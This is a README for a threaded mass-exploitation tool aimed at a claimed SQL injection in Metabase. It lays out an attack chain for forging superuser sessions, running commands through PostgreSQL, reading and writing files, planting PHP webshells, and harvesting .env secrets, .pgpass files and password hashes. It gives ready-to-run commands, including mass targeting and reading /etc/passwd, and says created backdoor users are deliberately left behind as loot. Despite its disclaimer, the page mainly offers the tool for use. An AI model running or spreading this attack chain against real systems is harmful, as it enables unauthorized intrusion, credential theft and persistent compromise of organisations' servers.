# MetaPwn Mass

**CVE-2026-72898 — Metabase Mass Exploitation & Post-Exploitation Framework**

A threaded Python 2/3 compatible exploit + post-exploitation toolkit targeting the SQL injection in Metabase's `/api/session/reset_password` endpoint that enables unauthenticated session forgery, authenticated API access, and — on PostgreSQL-backed instances — full RCE, file read, and file write capabilities.

> ⚠️ **FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.** See [DISCLAIMER](#disclaimer).

More Disclaimer You Can see the disclaimer on the cover of Jenderal92. You can check it [HERE !!!](https://github.com/Jenderal92/)

---

## Features

### Mass scanning
- Threaded target processing with per-host isolation

### Version detection
- Identifies Metabase version via `/api/session/properties`

### SQL injection primitive
- Abuses `reset_password` parameter injection

### Session forgery
- Creates valid superuser sessions without credentials

### Engine fingerprinting
- `pg_sleep` timing oracle for PostgreSQL detection

### Privilege enumeration
- `super`, `pg_execute_server_program`, `pg_read_server_files`, `pg_write_server_files`, `current_user`

### RCE
Three fallback methods:
- `COPY ... TO PROGRAM`
- `COPY ... FROM PROGRAM`
- `ALTER SYSTEM archive_command` + `pg_switch_wal`

### File read
- Arbitrary host file read via `pg_read_file()` (chunked)

### File write
- Arbitrary write via `lo_export()` and `COPY ... TO`

### Web shell drop
- Auto-detects docroots (nginx/apache configs, process cwd), writes PHP webshell, verifies via HTTP

### Secret extraction
- `.env`, `.pgpass`, `core_user` password hashes (opt-in)

### Credential harvesting
- Creates login users, resets admin password via `pgcrypto`

### Cleanup
- Removes probe users and (optionally) shells after exploitation

### Structured output
- Tab-separated `.txt` files, easy to `grep`/`awk`/import

---

## Requirements

- Python **2.7**
- No external dependencies (stdlib only)
- Network access to target Metabase instances

---

## Installation

```bash
git clone https://github.com/Jenderal92/metapwn-mass.git
cd metapwn-mass
chmod +x metapwn.py
```

No `pip install` needed.

---

## Usage

Basic:

```bash
python metapwn.py targets.txt
```

`targets.txt` — one target per line (scheme optional):

```
https://metabase.example.com
http://10.0.0.5:3000
metabase.internal.corp
# lines starting with # are ignored
```

Full example:

```bash
python metapwn.py targets.txt \
  -t 20 \
  -o ./loot \
  --exec "id; uname -a" \
  --shell \
  --shell-url https://metabase.example.com \
  --reset-admin admin@example.com \
  --hashes \
  -v
```

---

## Output Files

All files are tab-separated with a header row (safe to `grep`, `cut`, `awk`, import to Excel).

### `rce.txt`

| Column | Description |
|---|---|
| `target` | Base URL |
| `engine` | Detected DB engine |
| `version` | Metabase version tag |
| `exec_method` | `copy-to-program` / `copy-from-program` / `archive-command` / `none` / `lo_export` |
| `exec_status` | `yes` / `no` / `file-write` |
| `super` | Postgres superuser |
| `exec_prog` | Has `pg_execute_server_program` |
| `read_files` | Has `pg_read_server_files` |
| `write_files` | Has `pg_write_server_files` |
| `db_user` | `current_user` |
| `proof` | Command output or capability summary |

### `user_password.txt`

| Column | Description |
|---|---|
| `target` | Base URL |
| `email` | Email / key identifier |
| `password` | Password, hash, or secret value |
| `session_id` | Verified session id if applicable |
| `status` | `verified-forged-session` / `verified-new-admin` / `verified-reset` / `bcrypt-hash` / `env-secret:*` / `pgpass` |

### `shell.txt`

| Column | Description |
|---|---|
| `target` | Base URL |
| `docroot` | Writable directory used |
| `shell_url` | Reachable URL (if verified) |
| `perms` | `ls -l` output or write method |
| `exec_proof` | `id` output from shell |
| `status` | `verified` / `written` / `no-docroot` / `write-failed` |

---

## Attack Flow

```
1. GET /api/session/properties          → detect Metabase + version
2. POST /api/session/reset_password     → SQLi → INSERT forged core_session
3. GET /api/user/current                → verify session as superuser
4. (optional) POST /api/user            → create login user
5. (optional) reset admin password      → pgcrypto crypt() UPDATE
6. SELECT pg_sleep(3)                   → confirm PostgreSQL
7. POST /api/user                       → probe user for read-back channel
8. Privilege probe                      → 5 SELECT via read-back
9. RCE attempt                          → copy-to-program → copy-from-program → archive-command
10. (fallback) File-write shell         → lo_export + HTTP verify
11. Read-file recon                     → .env / .pgpass
12. (optional) Dump bcrypt hashes
13. Cleanup                             → DELETE probe user
```

The read-back channel uses `UPDATE core_user SET last_name = CAST((<expr>) AS VARCHAR)` then `GET /api/user/<id>` to exfiltrate single scalar values. This avoids outbound connections from the DB and works through any HTTP-only path.

---

## PostgreSQL Privilege Matrix

| Privilege | Source | Enables |
|---|---|---|
| `rolsuper = true` | `pg_roles` | Everything below |
| `pg_execute_server_program` | `pg_has_role` | RCE via `COPY ... PROGRAM`, `archive_command` |
| `pg_read_server_files` | `pg_has_role` | Arbitrary file read via `pg_read_file` |
| `pg_write_server_files` | `pg_has_role` | File write via `lo_export`, `COPY ... TO` |

When exec is closed but write is open, the tool drops a PHP webshell via `lo_export` and verifies it over HTTP — no command execution on the DB host required.

---

## Shell Drop Modes

### Exec mode (`COPY TO PROGRAM` available)

1. Runs an inline recon script on the DB host:
   - `ss -tln` / `netstat -tln` → listening ports
   - `ps aux` → nginx/apache/php-fpm processes
   - Parses `/etc/nginx`, `/etc/apache2`, `/etc/httpd` configs for `root` / `DocumentRoot`
   - Reads `/proc/<pid>/cwd` of web processes
2. Picks the first writable docroot
3. Writes base64-decoded PHP payload
4. Verifies via HTTP `?c=id`
5. (optional) `--shell-rm` removes the shell

### File-write mode (`pg_write_server_files` only)

1. Probes each candidate docroot with `lo_export` + `pg_stat_file`
2. Uses the first that succeeds
3. Same HTTP verification

If no docroot is writable, the row is still logged with `status=no-docroot`.

---

## Examples

### Single target, quiet, custom exec

```bash
echo "https://metabase.corp" > one.txt
python metapwn.py one.txt -q --exec "cat /etc/passwd | head"
```

### Full loot, 30 threads

```bash
python metapwn.py targets.txt -t 30 -o loot/ \
  --exec "id" --shell --shell-url https://metabase.corp \
  --reset-admin admin@corp.local --hashes -v
```

### Read-only (no RCE attempt)

```bash
python metapwn.py targets.txt --no-exec --no-shell
```

### Skip shell drop, only forge sessions + harvest creds

```bash
python metapwn.py targets.txt --no-exec --no-shell --no-login-user
```

---

## CLI Reference

```
positional arguments:
  listfile                File with one target per line

output:
  -o, --outdir DIR        Output directory (default: .)
  --rce-file NAME         Default: rce.txt
  --passwd-file NAME      Default: user_password.txt
  --shell-file NAME       Default: shell.txt

scanning:
  -t, --threads N         Worker threads (default: 10)
  --timeout SEC           HTTP timeout (default: 20)
  --ssl                   Prefix bare targets with https://
  -v, --verbose           Print exceptions / tracebacks
  -q, --quiet             Suppress per-row stdout echoes

execution:
  --exec CMD              Command to run (default: id)
  --no-exec               Disable RCE attempts
  --shell                 Drop webshell (default: on)
  --no-shell              Disable shell drop
  --shell-url URL         Override base URL for shell reachability check
  --shell-rm              Remove shell after verification

credentials:
  --no-login-user         Skip creating a persistent login user
  --reset-admin EMAIL     Reset admin password via pgcrypto crypt()
  --hashes                Dump bcrypt hashes from core_user
```

---

## FAQ

### Does this work without `pg_execute_server_program`?

Yes — the tool falls back to file-write (`lo_export`) for shell drop and `pg_read_file` for recon. It will still forge sessions and create login users regardless of DB privileges.

### Will it work on MySQL / H2 / non-Postgres backends?

Session forgery and authenticated API abuse work on any Metabase backend. RCE/file operations are PostgreSQL-specific and are skipped automatically on other engines.

### Does it clean up after itself?

The probe user is deleted in a `finally` block (3 retries). Shells are only removed with `--shell-rm`. Forged sessions and created login users are intentionally **not** cleaned up — they are the loot.

### Rate limiting?

Metabase enforces `Too many attempts` on `reset_password`. The engine detector retries with a 1.5s backoff. Reduce `-t` if you see many `engine=unknown` results.

### Why is there a probe user?

The read-back channel needs a user whose `last_name` we can UPDATE. The probe user (`mp-*@local.invalid`) is created, used, and deleted per target. It is filtered out of `fetch_users` results.

---

## Disclaimer

**This tool is provided for authorized security testing, academic research, and defensive purposes only.**

By using this software you agree that:

1. **You will only use it against systems you own, or for which you have explicit, written permission** from the system owner. This includes test environments, CTF challenges, and bug bounty programs within their published scope.

2. **You are solely responsible** for your actions and any consequences thereof. The author(s) and contributors of this tool accept **no liability** for misuse, damage, data loss, legal action, or any other outcome arising from its use.

3. **Unauthorized access to computer systems is illegal** in nearly every jurisdiction — including but not limited to the Computer Fraud and Abuse Act (CFAA, US), the Computer Misuse Act (UK), and equivalent laws worldwide. Violations may result in criminal prosecution, civil liability, and imprisonment.

4. **The tool is provided "as is"** without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

5. **You must not use this tool** to attack, scan, or exploit systems you do not own or have permission to test. Doing so may:
   - Violate terms of service, resulting in account termination
   - Constitute illegal access under computer crime laws
   - Cause service disruption, data corruption, or business harm
   - Result in civil lawsuits and/or criminal charges

6. **Responsible disclosure** — if you discover a vulnerability using this tool, report it to the affected vendor through their security contact or a coordinated disclosure program (e.g., HackerOne, Bugcrowd). Do not publicly disclose exploits against live production systems.

7. **Export and distribution** — this software may be subject to export control laws. You are responsible for compliance with all applicable regulations.

**If you do not agree to these terms, do not use this tool. Delete it immediately.**

---

## Legal

```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## Credits

- Metabase security advisories
- PostgreSQL `COPY ... PROGRAM`, `pg_read_file`, `lo_export` documentation
- Community research on SQLi-to-RCE chains in BI platforms

**Use responsibly. Test only what you own. Report what you find.**
